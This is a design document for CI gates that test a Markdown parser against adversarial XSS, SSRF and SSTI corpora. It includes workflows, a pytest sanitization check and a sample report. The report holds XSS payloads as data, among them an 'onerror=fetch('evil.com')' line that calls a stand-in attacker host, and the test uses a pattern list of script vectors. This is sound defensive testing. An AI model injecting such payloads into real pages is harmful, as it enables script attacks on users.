# P3-1: Adversarial Corpora as CI Gates

**Version**: 1.0
**Date**: 2025-10-17
**Status**: Production guidance (NOT skeleton implementation)
**Source**: PLAN_CLOSING_IMPLEMENTATION_extended_3.md P3-1 (lines 457-595)
**Purpose**: Ensure parser does not regress on known adversarial patterns via automated CI gates

---

## Purpose

Ensure parser does not regress on known adversarial patterns via automated CI gates.

**Security Value**:
- Catches XSS/SSRF/SSTI regressions automatically
- Validates caps enforcement (OOM/DoS prevention)
- Provides forensic artifacts for security analysis
- Enforces baseline security posture

---

## Basic CI Job Configuration

**FILE**: `.github/workflows/adversarial-corpus-gate.yml` (Production CI only)

```yaml
name: Adversarial Corpus Gate

on: [push, pull_request]

jobs:
  adversarial-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-python@v4
        with:
          python-version: '3.12'

      - name: Install dependencies
        run: |
          python -m venv .venv
          .venv/bin/pip install -e ".[dev]"

      - name: Run adversarial corpus tests
        run: |
          .venv/bin/python -m pytest \
            tests/test_adversarial_*.py \
            --junitxml=adversarial-results.xml \
            --cov=src/doxstrux \
            --cov-report=term-missing

      - name: Fail on any adversarial test failure
        if: failure()
        run: |
          echo "❌ Adversarial corpus tests failed - potential security regression"
          exit 1
```

**Key Features**:
- Runs on every push and PR
- Fails CI if any adversarial test fails
- Generates JUnit XML report
- Provides coverage report

---

## Advanced CI Job Configuration

**FILE**: `.github/workflows/adversarial_full.yml` (Production CI only)

```yaml
name: Adversarial Full Suite

on:
  pull_request:
    branches: [ main, develop ]
  schedule:
    - cron: '0 4 * * *'   # Nightly at 04:00 UTC

jobs:
  adversarial_suite:
    runs-on: ubuntu-latest
    timeout-minutes: 30

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.12'

      - name: Install dependencies
        run: |
          python -m venv .venv
          .venv/bin/pip install -e ".[dev]"
          .venv/bin/pip install bleach jinja2  # Security test dependencies

      - name: Create reports dir
        run: mkdir -p adversarial_reports

      - name: Run adversarial corpora (per-corpus reports)
        run: |
          set -e
          for corpus in adversarial_corpora/adversarial_*.json; do
            echo "Running adversarial corpus: $corpus"
            out="adversarial_reports/$(basename ${corpus%.*}).report.json"

            # Run with per-corpus timeout
            .venv/bin/python -u tools/run_adversarial.py "$corpus" \
              --runs 1 \
              --report "$out" || echo "Runner returned non-zero for $corpus"

            # Print summary
            if [ -f "$out" ]; then
              python - <<PY
import json
with open("$out") as f:
    d = json.load(f)
    if isinstance(d, dict):
        print(f"Findings: {len(d.get('findings', []))}")
PY
            fi
          done

      - name: Upload adversarial reports
        uses: actions/upload-artifact@v4
        with:
          name: adversarial-reports
          path: adversarial_reports/*.report.json
          retention-days: 30
```

**Enhanced Features**:
1. **Per-corpus reporting**: Separate JSON report for each adversarial corpus
2. **Artifact upload**: Reports persisted for 30 days for forensic analysis
3. **Timeout enforcement**: 30-minute job timeout prevents hangs
4. **Scheduled runs**: Nightly execution catches regressions early
5. **Dependency installation**: Ensures `bleach` and `jinja2` available for security tests

---

## Test Requirements

All adversarial corpus tests must:
1. ✅ **Pass without exceptions**: No crashes on adversarial input
2. ✅ **Complete within timeout**: 2s per doc, 30min total
3. ✅ **Validate security properties**: No XSS, SSRF, SSTI
4. ✅ **Enforce caps**: No OOM (links cap at 10K, images at 5K, etc.)

### Example Test Structure

```python
# FILE: tests/test_adversarial_xss.py

import pytest
import json
from pathlib import Path
from doxstrux.markdown_parser_core import MarkdownParserCore


def load_adversarial_corpus(corpus_name):
    """Load adversarial corpus JSON."""
    corpus_path = Path("adversarial_corpora") / f"{corpus_name}.json"
    with open(corpus_path) as f:
        return json.load(f)


def test_adversarial_xss_corpus():
    """Verify parser neutralizes all XSS payloads in corpus."""
    corpus = load_adversarial_corpus("adversarial_xss")

    for idx, payload in enumerate(corpus["payloads"]):
        markdown = payload["markdown"]

        # Parse with moderate security profile
        parser = MarkdownParserCore(markdown, security_profile="moderate")
        result = parser.parse()

        # CRITICAL: No XSS vectors in output
        html_blocks = result.get("html_blocks", [])
        for block in html_blocks:
            content = block.get("content", "")
            assert "<script>" not in content.lower(), \
                f"Payload {idx}: <script> tag not sanitized"
            assert "javascript:" not in content.lower(), \
                f"Payload {idx}: javascript: URL not sanitized"
            assert "onerror=" not in content.lower(), \
                f"Payload {idx}: onerror handler not sanitized"
```

---

## Corpus Freshness Policy

### Update Frequency

**Quarterly updates** to adversarial corpora:
1. **Review**: Latest OWASP patterns
2. **Add**: New CVEs and attack vectors
3. **Remove**: Obsolete patterns (if sanitized universally)

### Update Process

```bash
# Step 1: Review OWASP Top 10 updates
# https://owasp.org/www-project-top-ten/

# Step 2: Add new payloads to adversarial_xss.json
.venv/bin/python tools/add_adversarial_payload.py \
  --corpus adversarial_xss \
  --payload '<svg onload=alert(1)>' \
  --description 'SVG onload XSS (OWASP 2024 Q1)'

# Step 3: Run tests to verify parser handles new payload
.venv/bin/python -m pytest tests/test_adversarial_xss.py -v

# Step 4: Commit updated corpus
git add adversarial_corpora/adversarial_xss.json
git commit -m "Add SVG onload XSS payload (OWASP 2024 Q1)"
```

### Regeneration Policy

**Regenerate corpora after intentional parser improvements**:
- If parser changes sanitization logic → regenerate baselines
- If new collectors added → regenerate cap enforcement tests
- If URL normalization changes → regenerate SSRF tests

---

## CI Integration Best Practices

### 1. Fail Fast on Security Regressions

```yaml
- name: Run adversarial tests
  run: |
    .venv/bin/python -m pytest tests/test_adversarial_*.py -x  # -x stops on first failure
  # Exit 1 immediately if any adversarial test fails
```

### 2. Separate Security Tests from Unit Tests

```yaml
# Unit tests (fast, run on every commit)
- name: Run unit tests
  run: .venv/bin/python -m pytest tests/ -v --ignore=tests/test_adversarial_*

# Security tests (slower, run on PR + nightly)
- name: Run security tests
  run: .venv/bin/python -m pytest tests/test_adversarial_*.py -v
```

### 3. Timeout Enforcement

```yaml
jobs:
  adversarial_suite:
    runs-on: ubuntu-latest
    timeout-minutes: 30  # Prevent hangs
```

### 4. Artifact Retention

```yaml
- name: Upload adversarial reports
  uses: actions/upload-artifact@v4
  with:
    name: adversarial-reports
    path: adversarial_reports/*.report.json
    retention-days: 30  # 30 days for forensic analysis
```

---

## Monitoring and Alerting

### Slack Notification on Failure

```yaml
- name: Notify on failure
  if: failure()
  uses: 8398a7/action-slack@v3
  with:
    status: ${{ job.status }}
    text: |
      ❌ Adversarial corpus tests failed
      PR: ${{ github.event.pull_request.html_url }}
      Commit: ${{ github.sha }}
    webhook_url: ${{ secrets.SLACK_WEBHOOK }}
```

### GitHub Issue Creation on Repeated Failures

```yaml
- name: Create issue on repeated failures
  if: failure() && github.ref == 'refs/heads/main'
  uses: actions/github-script@v6
  with:
    script: |
      github.rest.issues.create({
        owner: context.repo.owner,
        repo: context.repo.repo,
        title: 'Adversarial corpus tests failing on main',
        body: 'Adversarial corpus tests have failed on main branch. This indicates a potential security regression.',
        labels: ['security', 'bug', 'high-priority']
      })
```

---

## Example: Per-Corpus Report Format

**FILE**: `adversarial_reports/adversarial_xss.report.json`

```json
{
  "corpus": "adversarial_xss",
  "timestamp": "2025-10-17T12:34:56Z",
  "total_payloads": 250,
  "passed": 248,
  "failed": 2,
  "findings": [
    {
      "payload_index": 12,
      "payload": "<svg onload=alert(1)>",
      "issue": "onerror handler not sanitized",
      "severity": "high",
      "recommendation": "Update bleach allowlist to strip 'onload' attribute"
    },
    {
      "payload_index": 87,
      "payload": "<img src=x onerror=fetch('evil.com')>",
      "issue": "onerror with fetch() not sanitized",
      "severity": "high",
      "recommendation": "Ensure bleach strips all event handlers"
    }
  ]
}
```

---

## Rollback Procedure

**If adversarial tests fail after deployment**:

### Step 1: Identify Regression

```bash
# Download adversarial reports from CI
gh run download <run-id> -n adversarial-reports

# Review findings
cat adversarial-reports/adversarial_xss.report.json | jq '.findings'
```

### Step 2: Revert to Last Known Good

```bash
# Revert commit
git revert <commit-hash>
git push origin main

# Or: Fast rollback via branch switch
git checkout last-known-good-tag
git checkout -b hotfix-rollback
git push origin hotfix-rollback --force
```

### Step 3: Verify Rollback

```bash
# Re-run adversarial tests
.venv/bin/python -m pytest tests/test_adversarial_*.py -v

# Expected: All tests pass
```

---

## Success Criteria

**CI gate complete when**:
- ✅ All adversarial corpus tests pass (100% pass rate)
- ✅ No security regressions detected
- ✅ Artifacts uploaded on failure (30-day retention)
- ✅ Nightly runs scheduled (detect drift)

---

## Effort Estimate

**Time**: 1 hour (CI configuration documentation)

**Breakdown**:
- Basic CI job setup: 15 minutes
- Advanced job with artifact upload: 30 minutes
- Corpus freshness policy: 10 minutes
- Monitoring/alerting: 5 minutes

---

## References

- **PLAN_CLOSING_IMPLEMENTATION_extended_3.md**: P3-1 specification (lines 457-595)
- **Adversarial corpora**: `/adversarial_corpora/` directory (9 JSON files)
- **External artifact**: `adversarial_full.yml` (enhanced CI workflow)

---

## Evidence Anchors

| Claim ID | Statement | Evidence | Status |
|----------|-----------|----------|--------|
| CLAIM-P3-1-DOC | Adversarial CI gates documented | This file | ✅ Complete |
| CLAIM-P3-1-BASIC | Basic CI job pattern provided | Basic CI Job section | ✅ Complete |
| CLAIM-P3-1-ADVANCED | Advanced CI job with artifacts | Advanced CI Job section | ✅ Complete |
| CLAIM-P3-1-POLICY | Corpus freshness policy documented | Corpus Freshness section | ✅ Complete |

---

**Document Status**: Complete
**Last Updated**: 2025-10-17
**Version**: 1.0
**Scope**: Production CI/CD guidance (NOT skeleton implementation)
**Approved By**: Pending Human Review
**Next Review**: After production CI/CD deployed
